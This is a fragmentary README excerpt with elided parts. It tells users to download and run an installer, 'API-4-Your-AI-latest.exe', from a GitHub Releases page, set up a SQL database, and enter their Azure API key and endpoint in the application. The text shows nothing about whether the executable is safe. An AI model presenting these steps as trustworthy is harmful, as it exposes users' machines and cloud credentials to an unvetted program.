...
## 📥 Download Now
[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/09sulka/API-4-Your-AI/releases)
...
[Visit this page to download](https://github.com/09sulka/API-4-Your-AI/releases)

### Step 3: Download the Application
On the Releases page, locate the latest version of the software. You will see a list of files available for download. 

Click on the appropriate file for your system. Most users will download the installer package labeled as `API-4-Your-AI-latest.exe`.

### Step 4: Install the Application
1. Locate the downloaded file in your computer's Downloads folder.
2. Double-click on the `API-4-Your-AI-latest.exe` file.
...
2. Create a new database named `AI_Connect`.
3. Run the script provided in the repository to set up the necessary tables and data.

### Step 6: Connect to Azure AI
To connect with Azure AI models, you will need to configure your Azure credentials.

1. Go to the settings within the application.
2. Enter your Azure API key and endpoint.
3. Save your changes.

### Step 7: Running the Application
1. Launch the application from your desktop.
2. Use the interface to interact with the AI models hosted on Azure or run local queries to your SQL database.
3. Follow on-screen instructions for various features and functionalities.
